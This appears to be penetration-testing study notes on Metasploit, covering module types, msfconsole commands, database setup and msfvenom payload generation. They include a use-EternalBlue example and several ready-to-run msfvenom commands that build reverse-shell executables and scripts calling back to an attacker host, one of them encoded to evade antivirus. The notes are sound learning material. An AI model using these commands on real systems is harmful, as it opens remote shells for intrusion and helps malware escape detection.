

modules: 
/opt/metasploit-framework/embedded/framework/modules
module rankings: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking


Auxiliary
Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

Encoders
Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.

Evasion
While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.

Exploits
Exploits, neatly organized by target system.

NOPs
NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

Payloads
Payloads are codes that will run on the target system.
* Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
* Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
* Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
* Stages: Downloaded by the stager. This will allow you to use larger sized payloads.


Post
Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

————————————————————————————————————————————————————————

commands:

- Set the context: use <module path> : `use exploit/windows/smb/ms17_010_eternalblue `
    - `show options`
    - `show payloads`: show other commands to use for the current exploit
    - Get module info in context: `info`
    - Set value for contextual option: `set PARAMETER_NAME VALUE`, `set LPORT 443`
    - Launch the module: `exploit`, `exploit -z`, `run`
    - Check if target system is vulnerable: `check`
    - `background` - puts the exploit session in background. This commands is run in meterpreter session
    - `sessions`: list available sessions
    - `sessions -i 2` : interact with the session number 2
- `back` : leave the context
- `info <module path>` : get information for given module
- `search <keywords>`: searches module using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system:
    - filter based on module: `search type:auxiliary telnet`


——

Setup Database:

    - msfdb init 
    - in msfconsole:
        - `db_status`
        - `workspace`: shows different workspaces ( targets/projects) available
        - `Hosts`: lists different scanned hosts
        - `services`: lists scanned services
        - `db_nmap`: same as nmap, but store the results in database
——  ——————

Generate Payloads using msfvenom

- `msfvenom -l payloads` : list all payloads
- `msfvenom --list formats` : list available payload formats. Eg. php
- `-e encoding_type` : set encoding
- `use exploit/multi/handler`: metasploit handler to catch any incoming reverse shell requests triggered by msfvenom payloads. set appropriate payload  value
- Eg. `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
* Linux Executable and Linkable Format (elf) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
* Windows  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
* PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php  ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp  Python msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe